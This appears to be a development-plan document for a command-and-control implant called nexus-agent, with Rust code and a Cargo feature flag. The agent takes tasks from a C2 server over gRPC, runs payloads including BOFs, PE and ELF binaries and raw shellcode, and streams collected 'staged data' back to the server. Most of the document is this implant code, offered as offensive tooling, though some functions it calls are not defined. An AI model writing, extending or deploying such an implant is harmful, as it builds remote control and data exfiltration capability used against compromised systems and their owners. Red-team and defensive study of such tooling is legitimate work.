# v2.5.7 — Agent Integration

## Overview

Integrate the sandbox runtime into the nexus-agent executable. The `SandboxAgent` wrapper receives sandbox tasks from the C2 server via gRPC, executes payloads in the sandbox, forwards staged data back through the gRPC channel, and maintains backward compatibility with existing BOF task types.

## Prerequisites

- Phase 5+ complete (at least BOF and one other loader working)
- Phase 6 complete (gRPC protocol wired)

## Implementation Details

### 7.1 SandboxAgent Wrapper

```rust
// nexus-agent/src/sandbox_integration.rs

use nexus_sandbox::{SandboxRuntime, ExecutableFormat, Capabilities};
use nexus_sandbox::broker::StagedData;
use tokio::sync::mpsc;

pub struct SandboxAgent {
    sandbox: SandboxRuntime,
    staged_data_rx: mpsc::Receiver<StagedData>,
    grpc_client: GrpcClient,
}

impl SandboxAgent {
    pub async fn new(grpc_client: GrpcClient) -> Result<Self, AgentError> {
        let (staged_tx, staged_rx) = mpsc::channel(256);

        Ok(Self {
            sandbox: SandboxRuntime::new(staged_tx)?,
            staged_data_rx: staged_rx,
            grpc_client,
        })
    }

    /// Main event loop — receives tasks and forwards staged data
    pub async fn run(&mut self) {
        loop {
            tokio::select! {
                Some(task) = self.receive_sandbox_task() => {
                    self.handle_sandbox_task(task).await;
                }
                Some(staged) = self.staged_data_rx.recv() => {
                    self.forward_staged_data(staged).await;
                }
            }
        }
    }

    async fn forward_staged_data(&mut self, data: StagedData) {
        if let Err(e) = self.grpc_client.stream_staged_data(data).await {
            log::error!("Failed to forward staged data: {}", e);
        }
    }
}
```

### 7.2 Task Routing

Route incoming tasks to the appropriate execution path:

```rust
impl SandboxAgent {
    async fn handle_sandbox_task(&mut self, task: SandboxExecuteTask) -> TaskResult {
        let format = match task.format {
            1 => ExecutableFormat::Bof,
            2 => ExecutableFormat::Pe,
            3 => ExecutableFormat::Elf,
            4 => ExecutableFormat::Wasm,
            5 => ExecutableFormat::Shellcode,
            _ => return TaskResult::error("Unknown format"),
        };

        let capabilities = task.capabilities
            .map(|c| Capabilities::from_proto(&c))
            .unwrap_or_else(Capabilities::bof_defaults);

        let result = self.sandbox.execute(
            format,
            &task.payload,
            capabilities,
            task.staged_input,
            task.args,
        ).await;

        match result {
            Ok(exec_result) => TaskResult::from_execution(exec_result),
            Err(e) => TaskResult::error(e.to_string()),
        }
    }
}
```

### 7.3 Backward Compatibility — Legacy BOF Tasks

Existing BOF tasks in the agent should transparently route through the sandbox:

```rust
// nexus-agent/src/execution.rs — modify existing TaskExecutor

async fn execute_task(&mut self, task: Task) -> TaskResult {
    match task.task_type {
        // Legacy BOF execution → route through sandbox
        TaskType::BofExecute { bof_data, args } => {
            if let Some(sandbox) = &mut self.sandbox_agent {
                // Use sandbox for isolated execution
                let sandbox_task = SandboxExecuteTask {
                    task_id: task.id.clone(),
                    format: ExecutableFormat::Bof as i32,
                    payload: bof_data,
                    capabilities: Some(Capabilities::bof_defaults().to_proto()),
                    staged_input: HashMap::new(),
                    args: vec![base64::encode(&args)],
                };
                sandbox.handle_sandbox_task(sandbox_task).await
            } else {
                // Fallback: direct execution (existing behavior)
                self.execute_bof_direct(&bof_data, &args).await
            }
        }

        // New sandbox task type
        TaskType::SandboxExecute(sandbox_task) => {
            self.sandbox_agent.as_mut()
                .ok_or("Sandbox not initialized")?
                .handle_sandbox_task(sandbox_task).await
        }

        // All other task types unchanged
        _ => self.execute_legacy(task).await,
    }
}
```

### 7.5 Feature Flag

Gate sandbox behind a Cargo feature to keep agent binary small when not needed:

```toml
# nexus-agent/Cargo.toml
[features]
sandbox = ["nexus-sandbox"]

[dependencies]
nexus-sandbox = { path = "../nexus-sandbox", optional = true }
```
